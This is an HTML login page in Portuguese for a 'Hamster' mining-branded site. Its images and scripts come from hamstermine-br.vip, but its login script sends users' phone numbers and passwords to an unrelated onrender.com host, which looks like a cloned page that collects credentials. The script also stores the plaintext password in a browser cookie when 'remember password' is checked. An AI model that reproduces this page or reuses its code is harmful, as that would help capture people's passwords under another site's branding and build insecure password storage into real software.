<!doctype html>
<html lang="pt">
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <title>Hamster Entrar</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no">
    <meta name="wap-font-scale" content="no">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Microsoft YaHei", "PingFang SC", "Helvetica Neue", Arial, sans-serif;
            overflow: hidden;
            height: 100vh;
        }

        .login-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('/static/home/img/mb/0001.png');
            background-size: 100% 100%;
            z-index: -2;
        }

        .login-background::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image:
                radial-gradient(circle at 20% 30%, rgba(255, 215, 0, 0.4) 0%, transparent 60%),
                radial-gradient(circle at 80% 20%, rgba(255, 165, 0, 0.5) 0%, transparent 60%),
                radial-gradient(circle at 40% 70%, rgba(255, 140, 0, 0.4) 0%, transparent 60%),
                radial-gradient(circle at 90% 80%, rgba(255, 215, 0, 0.3) 0%, transparent 60%),
                radial-gradient(circle at 10% 90%, rgba(255, 165, 0, 0.4) 0%, transparent 60%),
                radial-gradient(circle at 70% 60%, rgba(255, 140, 0, 0.3) 0%, transparent 60%),
                radial-gradient(circle at 30% 10%, rgba(255, 215, 0, 0.2) 0%, transparent 60%),
                radial-gradient(circle at 60% 40%, rgba(255, 165, 0, 0.3) 0%, transparent 60%);
            animation: bokeh 15s ease-in-out infinite;
        }

        @keyframes  bokeh {
            0%, 100% {
                opacity: 0.7;
                transform: scale(1) rotate(0deg);
            }
            50% {
                opacity: 1;
                transform: scale(1.2) rotate(180deg);
            }
        }

        .login-container {
            position: relative;
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-avatar {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: linear-gradient(135deg, #4A90E2, #7B68EE);
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
            border: 3px solid rgba(255, 255, 255, 0.3);
        }

        .login-avatar img {
            width: 100%;
            height: 100%;
        }

        .login-title {
            color: white;
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 30px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
        }

        .login-form-container {
            width: 100%;
            max-width: 350px;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
        }

        .input-group input {
            width: 100%;
            height: 50px;
            padding: 0 20px 0 85px;
            border: none;
            border-radius: 25px;
            background: rgba(0, 0, 0, 0.6);
            color: white;
            font-size: 16px;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }

        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }

        .input-group input:focus {
            outline: none;
            border-color: rgba(255, 215, 0, 0.5);
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
        }

        .input-icon {
            width: 21px;
            height: 24px;
            position: absolute;
            left: 18px;
            top: 50%;
            transform: translateY(-50%);
            color: rgba(255, 255, 255, 0.7);
            font-size: 18px;
            z-index: 1;
        }

        .input-icon img {
            width: 100%;
            height: 100%;
        }

        .remember-container {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
            color: white;
            font-size: 14px;
        }

        .remember-container input[type="checkbox"] {
            margin-right: 8px;
            width: 16px;
            height: 16px;
            accent-color: #FFD700;
        }

        .button-group {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
        }

        .btn-login,
        .btn-register {
            flex: 1;
            height: 50px;
            border: none;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .btn-login {
            background: linear-gradient(135deg, #FFD700, #FFA500);
            color: #8B4513;
            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.4);
        }

        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 215, 0, 0.6);
        }

        .btn-register {
            background: transparent;
            color: white;
            border: 2px solid rgba(255, 255, 255, 0.4);
        }

        .btn-register:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: rgba(255, 255, 255, 0.6);
        }

        .country-code {
            position: absolute;
            left: 40px;
            top: 46%;
            transform: translateY(-50%);
            pointer-events: none;
            color: rgb(255, 196, 0);
            font-size: 16px;
            font-weight: 500;
            z-index: 2;
        }

        .separator {
            position: absolute;
            left: 88px;
            top: 50%;
            transform: translateY(-50%);
            pointer-events: none;
            color: rgba(255, 255, 255, 0.5);
            font-size: 16px;
            z-index: 2;
        }

        .input-group.mobile-input input {
            padding: 0 20px 0 80px;
        }

        .input-group.mobile-input input::placeholder {
            color: rgba(255, 255, 255, 0.6);
            padding-left: 5px;
        }

        .input-group:not(.mobile-input) input {
            padding: 0 20px 0 45px;
        }

        @media (max-width: 480px) {
            .login-avatar {
                width: 100px;
                height: 100px;
            }

            .login-title {
                font-size: 24px;
            }

            .login-form-container {
                max-width: 300px;
            }
        }
    </style>
</head>

<body>
    <!-- Fundo -->
    <div class="login-background"></div>

    <!-- Container de Login -->
    <div class="login-container">
        <!-- Avatar -->
        <div class="login-avatar">
            <img src="https://hamstermine-br.vip/static/home/img/mb/0002.png" />
        </div>

        <!-- Título -->
        <div class="login-title">Entrar</div>

        <!-- Container do Formulário -->
        <div class="login-form-container">
            <form name="form" method="post" id="form">
                <div class="input-group mobile-input">
                    <div class="input-icon"><img src="https://hamstermine-br.vip/static/home/img/mb/0004.png" /></div>
                    <span class="country-code">+244</span>
                    <input type="text" id="mobile" name="mobile" minlength="7" maxlength="9"
                        placeholder="Digite seu número de celular">
                </div>

                <div class="input-group">
                    <div class="input-icon"><img src="https://hamstermine-br.vip/static/home/img/mb/0005.png" /></div>
                    <input type="password" id="password" name="password" maxlength="32"
                        placeholder="Digite sua senha">
                </div>

                <div class="remember-container">
                    <input type="checkbox" id="remember_password">
                    <label for="remember_password">Lembrar senha</label>
                </div>

                <div class="button-group">
                    <a href="https://hamstermine-br.vip/login/register" class="btn-register">Registrar</a>
                    <button type="button" class="btn-login btn_submit_my">Entrar</button>
                </div>
            </form>
        </div>
    </div>

    <script type="text/javascript" src="https://hamstermine-br.vip/static/home/js/jquery-1.11.3.min.js"></script>
    <script type="text/javascript" src="https://hamstermine-br.vip/static/home/js/layer.js"></script>
    <script type="text/javascript">
        var _submit = true;
        $(".btn_submit_my").click(function() {
            if (_submit == true) {
                _submit = false;
                var loading = layer.open({
                    type: 2,
                    content: "Carregando"
                });
            } else {
                return false;
            }
            
            var mobile = $("input[name='mobile']").val();
            var password = $("input[name='password']").val();
            
            if (mobile.length == 0) {
                layer.close(loading);
                layer.open({
                    content: "Por favor, insira o número de telefone...",
                    skin: 'msg',
                    time: 2
                });
                _submit = true;
                return false;
            }
            
            if (password.length == 0) {
                layer.close(loading);
                layer.open({
                    content: "Por favor, insira a senha...",
                    skin: 'msg',
                    time: 2
                });
                _submit = true;
                return false;
            }
            
            var isSave = document.getElementById('remember_password').checked;
            if (isSave) {
                if (mobile != "" && password != "") {
                    setCookie('mobile', mobile, 7);
                    setCookie('password', password, 7);
                }
            } else {
                clearAllCookie();
            }
            
            var _token = "";
            var data = {
                mobile: "+244" + mobile,  // Adiciona prefixo +244
                password: password,
                _token: _token
            };
            
            $.ajax({
                url: "https://bd-1-tile.onrender.com/login",
                type: "POST",
                data: JSON.stringify(data),
                contentType: "application/json",
                dataType: "json",
                success: function(result) {
    layer.close(loading);

    if (result.code == 200) {
        // Salva o token no localStorage
        localStorage.setItem('token', result.token);

        layer.open({
            content: "Login realizado com sucesso...",
            skin: 'msg',
            time: 2
        });
        setTimeout(function() {
            window.location.href = "/dashboard";
        }, 2000);
    } else {
        if (result.code === 401 && result.msg === "Senha incorreta") {
            layer.open({
                content: "Senha incorreta. Por favor, tente novamente.",
                skin: 'msg',
                time: 2
            });
        } else {
            layer.open({
                content: result.msg || "Erro ao fazer login",
                skin: 'msg',
                time: 2
            });
        }
        _submit = true;
    }
},

                error: function(xhr) {
                    layer.close(loading);
                    var response = xhr.responseJSON;
                    
                    if (xhr.status === 401) {
                        layer.open({
                            content: "Senha incorreta. Por favor, tente novamente.",
                            skin: 'msg',
                            time: 2
                        });
                    } else {
                        layer.open({
                            content: "Telefone incorreto.",
                            skin: 'msg',
                            time: 2
                        });
                    }
                    _submit = true;
                }
            });
        });

        function clearAllCookie() {
            var keys = document.cookie.match(/[^ =;]+(?=\=)/g);
            if (keys) {
                for (var i = keys.length; i--;)
                    document.cookie = keys[i] + '=0;expires=' + new Date(0).toUTCString()
            }
        }

        function setCookie(name, value, day) {
            var date = new Date();
            date.setDate(date.getDate() + day);
            document.cookie = name + '=' + value + ';expires=' + date;
        }

        function getCookie(name) {
            var reg = RegExp(name + '=([^;]+)');
            var arr = document.cookie.match(reg);
            if (arr) {
                return arr[1];
            } else {
                return '';
            }
        }

        $(function() {
            var oUser = getCookie('mobile');
            var oPswd = getCookie('password');
            if (oUser && oPswd) {
                $("input[name='mobile']").val(oUser);
                $("#password").val(oPswd);
                document.getElementById('remember_password').checked = true;
            }
        });

        // Melhorar a visibilidade dos botões
        $(document).ready(function() {
            $('.btn-login').css({
                'background': 'linear-gradient(135deg, #FFD700, #FFA500)',
                'color': '#8B4513',
                'box-shadow': '0 8px 25px rgba(255, 215, 0, 0.8), 0 4px 15px rgba(0, 0, 0, 0.5)',
                'border': '3px solid rgba(255, 255, 255, 0.9)',
                'font-weight': '700'
            });

            $('.btn-register').css({
                'background': 'rgba(255, 255, 255, 0.95)',
                'color': '#8B4513',
                'border': '3px solid rgba(255, 255, 255, 0.95)',
                'box-shadow': '0 8px 25px rgba(0, 0, 0, 0.5)',
                'font-weight': '700'
            });
        });
    </script>
</body>
</html>
